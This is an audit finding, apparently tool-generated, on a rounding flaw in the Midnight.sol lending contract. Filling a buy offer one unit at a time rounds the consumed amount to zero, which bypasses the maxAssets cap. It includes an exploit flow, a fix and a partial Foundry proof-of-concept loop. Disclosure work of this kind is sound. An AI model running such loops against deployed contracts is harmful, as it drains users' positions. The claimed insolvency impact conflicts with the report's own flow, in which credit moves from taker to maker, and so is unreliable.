### Title
Zero-increment consumed accounting on buy offers with `maxAssets > 0` allows unlimited fills — (`src/Midnight.sol`)

### Summary
For a buy offer (`offer.buy = true`) with `maxAssets > 0`, the consumed-budget tracking increments by `buyerAssets = units.mulDivDown(buyerPrice, WAD)`. Because `buyerPrice = offerPrice` for buy offers (the settlement fee cancels algebraically), any call with `units = 1` and a non-zero tick (`offerPrice < WAD`) produces `buyerAssets = 0`. The consumed mapping is incremented by zero on every such call, so the `maxAssets` cap is never reached and the offer can be filled an unlimited number of times.

### Finding Description

**Algebraic identity that eliminates the settlement fee from `buyerPrice`:**

```
sellerPrice = offerPrice - _settlementFee   // line 361
buyerPrice  = sellerPrice + _settlementFee  // line 362
           = offerPrice                     // fee cancels
``` [1](#0-0) 

`buyerPrice` is therefore always equal to `offerPrice` for buy offers, regardless of `timeToMaturity` or the settlement fee value.

**Rounding to zero:**

```
buyerAssets = units.mulDivDown(buyerPrice, WAD)
            = (1 * offerPrice) / WAD
            = 0   for any offerPrice < WAD (i.e. any tick > 0)
``` [2](#0-1) 

`tickToPrice` returns values in `(0, WAD]`; only tick = 0 gives exactly WAD. Every other valid tick gives `offerPrice < WAD`, so `mulDivDown(1, offerPrice, WAD) = 0`.

**Consumed tracking uses `buyerAssets` for buy offers:**

```solidity
if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
``` [3](#0-2) 

When `buyerAssets = 0`, `newConsumed = consumed + 0 = consumed`. The `require` trivially passes on every iteration. No existing check enforces that `buyerAssets > 0` before accepting the fill.

**Exploit flow:**

1. Maker creates a buy offer with `maxAssets = X > 0` and any tick > 0.
2. Taker (who holds ≥ N units of credit in the market) calls `take(offer, …, 1, …)` N times.
3. Each call: `buyerAssets = 0`, `consumed` stays at 0, the `ConsumedAssets` check passes.
4. Each call transfers the maker 1 unit of credit and removes 1 unit of credit from the taker, with 0 tokens exchanged.
5. After N calls the maker holds N units of credit backed by 0 deposited tokens; the offer's `maxAssets` budget is entirely unspent.

The "near maturity" framing in the question is consistent (at TTM → 0, `_settlementFee → settlementFeeCbp0 * CBP`, which can be 0, making `sellerAssets = 0` as well), but the zero-increment condition on `buyerAssets` holds at **any** TTM for any tick > 0 — it is not gated on maturity.

### Impact Explanation
The `maxAssets` cap on a buy offer is completely bypassed. An attacker can fill the offer an unbounded number of times, each time transferring 1 unit of credit to the maker for 0 tokens. The maker accumulates credit that can later be redeemed for loan tokens, but no corresponding tokens were ever deposited, violating the core solvency invariant that contract balances cover credit redemption. The offer is effectively reused indefinitely.

### Likelihood Explanation
**Preconditions:**
- A buy offer with `maxAssets > 0` and any tick > 0 (the common case — tick = 0 is the maximum price and rarely used).
- The taker must hold credit in the market (to avoid taking on debt, which requires collateral and a health check). A taker with existing credit can drain it unit-by-unit.

**Feasibility:** Fully reachable with no privileged access. The taker calls `take` with `units = 1` in a loop. Gas cost is the only practical limit. Repeatable indefinitely within a single block via `multicall`.

### Recommendation
When `offer.maxAssets > 0`, require that the fill actually consumes a non-zero amount of the budget:

```solidity
if (offer.maxAssets > 0) {
    uint256 delta = offer.buy ? buyerAssets : sellerAssets;
    require(units == 0 || delta > 0, ZeroAssetFill());
    newConsumed = consumed[offer.maker][offer.group] += delta;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

Alternatively, track consumed in units even when `maxAssets > 0`, and enforce the asset cap only at the end of the fill by comparing the cumulative asset total.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {Midnight, Offer, Market} from "src/Midnight.sol";

contract BuyOfferZeroConsumedPoC is Test {
    Midnight midnight;
    address maker = address(0xA);
    address taker = address(0xB);
    uint256 constant FILLS = 1000;

    function testUnlimitedFillBuyOffer() public {
        // Setup: create market, give taker credit >= FILLS units
        // (e.g. via a prior sell-offer take so taker.credit = FILLS)

        Offer memory offer;
        offer.buy      = true;
        offer.maker    = maker;
        offer.maxAssets = 1e18;   // maker intends to buy at most 1e18 assets worth
        offer.tick     = 1;       // any tick > 0 → offerPrice < WAD
        // ... set market, ratifier, expiry, group

        uint256 consumedBefore = midnight.consumed(maker, offer.group);

        vm.startPrank(taker);
        for (uint256 i = 0; i < FILLS; i++) {
            midnight.take(offer, "", 1, taker, address(0), address(0), "");
        }
        vm.stopPrank();

        uint256 consumedAfter = midnight.consumed(maker, offer.group);

        // ASSERTION: consumed never moved despite FILLS successful takes
        assertEq(consumedAfter, consumedBefore, "consumed must stay 0");

        // ASSERTION: maker received FILLS units of credit for 0 tokens paid
        assertEq(midnight.creditOf(midnight.toId(offer.market), maker), FILLS);
    }
}
```

Expected result: all `FILLS` calls succeed, `consumed` remains 0, and the maker holds `FILLS` units of credit backed by 0 deposited tokens — directly demonstrating the invariant violation.

### Citations

**File:** src/Midnight.sol (L361-362)
```text
        uint256 sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice;
        uint256 buyerPrice = sellerPrice + _settlementFee;
```

**File:** src/Midnight.sol (L363-363)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
```

**File:** src/Midnight.sol (L367-369)
```text
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```
